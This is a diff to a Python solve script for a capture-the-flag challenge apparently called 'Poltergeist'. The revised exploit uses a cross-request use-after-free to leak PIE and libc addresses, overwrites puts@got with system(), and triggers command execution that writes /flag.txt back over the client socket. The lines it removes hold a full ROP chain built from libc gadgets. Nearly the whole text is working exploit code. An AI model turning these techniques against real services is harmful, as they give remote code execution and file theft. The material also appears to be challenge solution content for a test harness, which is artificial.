@@ -160,7 +160,7 @@ def libc_gadget(d, segs, pattern):
 #  Proof-of-work + raw HTTP (one connection, Connection: close).
 # --------------------------------------------------------------------------- #
 
-def raw_http(host, port, method, path, body=b"", headers=None, timeout=20):
+def raw_http(host, port, method, path, body=b"", headers=None, timeout=20, full=False):
     headers = headers or {}
     req = "%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n" % (method, path, host)
     req += "Content-Length: %d\r\n" % len(body)
@@ -178,6 +178,8 @@ def raw_http(host, port, method, path, body=b"", headers=None, timeout=20):
             buf += c
     finally:
         s.close()
+    if full:                                   # whole response (the RCE writes the
+        return buf                             # flag to the socket before the headers)
     _, _, payload = buf.partition(b"\r\n\r\n")
     return payload
 
@@ -211,16 +213,16 @@ def refresh_pow(host, port):
           file=sys.stderr)
 
 
-def seance(host, port, body=b"", headers=None):
+def seance(host, port, body=b"", headers=None, full=False):
     hdrs = dict(headers or {})
     if POW_HDR[0]:
         hdrs["X-Pow"] = POW_HDR[0]
-    pay = raw_http(host, port, "POST", "/seance", body, hdrs)
+    pay = raw_http(host, port, "POST", "/seance", body, hdrs, full=full)
     if b"proof-of-work" in pay[:64]:
         refresh_pow(host, port)
         if POW_HDR[0]:
             hdrs["X-Pow"] = POW_HDR[0]
-        pay = raw_http(host, port, "POST", "/seance", body, hdrs)
+        pay = raw_http(host, port, "POST", "/seance", body, hdrs, full=full)
     return pay
 
 
@@ -273,12 +275,12 @@ def load_offsets():
                 p = line.split()
                 if len(p) == 2:
                     o[p[0]] = int(p[1], 16)
-        for k in ("arena", "clientfd", "write_got", "retsite"):
+        for k in ("arena", "clientfd", "write_got", "puts_got"):
             if k not in o:
                 raise KeyError(k)
         return o
     except (OSError, KeyError, ValueError) as e:
-        raise ValueError("need author offsets (arena/clientfd/write_got/retsite) in "
+        raise ValueError("need author offsets (arena/clientfd/write_got/puts_got) in "
                          "%s: %s" % (OFFSETS, e))
 
 
@@ -286,21 +288,21 @@ def log(*a):
     print(*a, file=sys.stderr)
 
 
-def exploit(host, port, cand):
-    """One full attempt. `cand` selects which return-slot candidate to use
-    (0 = the one closest to the stack top). A wrong candidate crashes the worker,
-    which the watchdog respawns, so the next attempt re-leaks fresh and tries the
-    next candidate."""
+def exploit(host, port):
+    """Leak PIE + libc, overwrite puts@got with system(), then trigger knell()
+    so the worker runs  system("cat /flag.txt 1>&<clientfd>")  and the flag is
+    written straight back down the player's own socket. No stack return is
+    overwritten, so this works with CET / shadow stack enabled."""
     off = load_offsets()
     if POW_HDR[0] is None:
-        refresh_pow(host, port)          # solve once; reused across attempts/respawns
+        refresh_pow(host, port)          # solve once; reused across attempts
 
     pie = leak_pie(host, port, off["arena"])
     if pie is None:
         raise IOError("PIE leak failed")
-    log("[*] pie base         = 0x%x" % pie)
+    log("[*] pie base   = 0x%x" % pie)
 
-    # libc base (from write@got) and the client socket fd, in one read
+    # libc base (from the resolved write@got) and the client socket fd, in one read
     span = (off["clientfd"] - off["write_got"]) + 8
     win = forge_read(host, port, pie + off["write_got"], span)
     write_ptr = struct.unpack_from("<Q", win, 0)[0]
@@ -308,70 +310,25 @@ def exploit(host, port, cand):
     libc = write_ptr - elf_dynsym(LIBC, "write")
     if libc & 0xfff:
         raise IOError("libc base not page-aligned (0x%x)" % libc)
-    log("[*] libc base        = 0x%x   clientfd = %d" % (libc, cfd))
+    system = libc + elf_dynsym(LIBC, "system")
+    log("[*] libc base  = 0x%x   system = 0x%x   clientfd = %d" % (libc, system, cfd))
 
-    # stack: environ -> a stack address, then find process_request's return slot.
-    # Collect every candidate (the saved return appears once per live frame) and
-    # order them by distance below the stack top.
-    sp = struct.unpack_from("<Q", forge_read(host, port, libc + elf_dynsym(LIBC, "environ"), 8), 0)[0]
-    target = pie + off["retsite"]
-    region = forge_read(host, port, sp - 0x1E000, 0x1E000)
-    hits = sorted({sp - 0x1E000 + i for i in range(0, len(region) - 7)
-                   if struct.unpack_from("<Q", region, i)[0] == target}, reverse=True)
-    log("[*] stack=0x%x  retsite=0x%x  candidates: %s"
-        % (sp, target, ", ".join("0x%x(-0x%x)" % (h, sp - h) for h in hits) or "none"))
-    if not hits:
-        raise IOError("return slot not found on the stack")
-    retslot = hits[cand % len(hits)]
-    log("[*] using candidate %d/%d -> retslot = 0x%x" % (cand % len(hits), len(hits), retslot))
+    # overwrite puts@got -> system (Partial RELRO: .got.plt is writable)
+    forge_write(host, port, pie + off["puts_got"], struct.pack("<Q", system))
 
-    # libc gadgets + a syscall;ret
-    d, segs = _read(LIBC), _load_segments(_read(LIBC))
-    g_rdi = libc + libc_gadget(d, segs, b"\x5f\xc3")        # pop rdi ; ret
-    g_rsi = libc + libc_gadget(d, segs, b"\x5e\xc3")        # pop rsi ; ret
-    g_rdx = libc + libc_gadget(d, segs, b"\x5a\xc3")        # pop rdx ; ret
-    g_rax = libc + libc_gadget(d, segs, b"\x58\xc3")        # pop rax ; ret
-    g_sys = libc + libc_gadget(d, segs, b"\x0f\x05\xc3")    # syscall ; ret
-    log("[*] gadgets rdi=0x%x rsi=0x%x rdx=0x%x rax=0x%x sys=0x%x"
-        % (g_rdi, g_rsi, g_rdx, g_rax, g_sys))
-
-    # write(cfd,MARK,7) -> open("/flag.txt",0) -> read(cfd+1,buf,100)
-    #                   -> write(cfd,buf,100) -> exit
-    MARK, PATH, BUF = object(), object(), object()
-    rop = [g_rdi, cfd, g_rsi, MARK, g_rdx, 7, g_rax, 1, g_sys,         # write marker
-           g_rdi, PATH, g_rsi, 0, g_rdx, 0, g_rax, 2, g_sys,          # open
-           g_rdi, cfd + 1, g_rsi, BUF, g_rdx, 100, g_rax, 0, g_sys,   # read (fd = cfd+1)
-           g_rdi, cfd, g_rsi, BUF, g_rdx, 100, g_rax, 1, g_sys,       # write flag
-           g_rax, 60, g_sys]                                          # exit
-    mark_addr = retslot + len(rop) * 8
-    path_addr = mark_addr + 8
-    buf_addr = path_addr + 16
-    rop = [mark_addr if x is MARK else path_addr if x is PATH else
-           buf_addr if x is BUF else x for x in rop]
-    chain = b"".join(struct.pack("<Q", x) for x in rop)
-    chain += b"ROP_OK\n\x00" + b"/flag.txt\x00".ljust(16, b"\x00") + b"\x00" * 112
-
-    if cand == 0:   # confirm a STACK write lands (one request: write then recall)
-        tgt = retslot + 0x80                    # a stack slot near (not) the return
-        mk = b"STK_MRK!"
-        poison(host, port)
-        mv = struct.pack("<qqq", 2, len(mk), tgt)
-        r = seance(host, port, b'summon $f = "' + esc(mv) + b'"; summon $d = "' +
-                   esc(mk) + b'"; echo_write($d); whisper recall();')
-        log("[*] STACK-WRITE-CONFIRM wrote %r recall %r -> %s"
-            % (mk, r[:8], "OK" if r[:8] == mk else "MISMATCH"))
-
-    tail = forge_write(host, port, retslot, chain)          # lay chain + trigger
-    log("[*] cand %d finale resp %d bytes: %r" % (cand, len(tail), tail[:80]))
-    m = FLAG_RE.search(tail)
+    # trigger: knell(cmd) -> puts(cmd) -> system(cmd); cat writes the flag to our fd
+    cmd = b'cat /flag.txt 1>&%d' % cfd
+    resp = seance(host, port, b'knell("' + cmd + b'");', full=True)
+    log("[*] trigger resp %d bytes: %r" % (len(resp), resp[:80]))
+    m = FLAG_RE.search(resp)
     return m.group(0).decode() if m else None
 
 
 def solve(host, port):
-    log("[*] Poltergeist -- RCE via cross-request UAF -> ROP")
-    for attempt in range(0, 1):
+    log("[*] Poltergeist -- RCE via cross-request UAF -> GOT overwrite -> system")
+    for attempt in range(0, 5):
         try:
-            flag = exploit(host, port, attempt)
+            flag = exploit(host, port)
         except (OSError, IOError, ValueError) as e:
             log("[!] attempt %d: %s" % (attempt, e))
             time.sleep(0.4)
@@ -380,7 +337,7 @@ def solve(host, port):
             print(flag)                      # stdout: the harness greps this
             log("[+] FLAG: " + flag)
             return 0
-        log("[!] attempt %d: chain ran but no flag; trying next candidate" % attempt)
+        log("[!] attempt %d: triggered but no flag; retrying" % attempt)
         time.sleep(0.4)
     log("[!] giving up")
     return 1
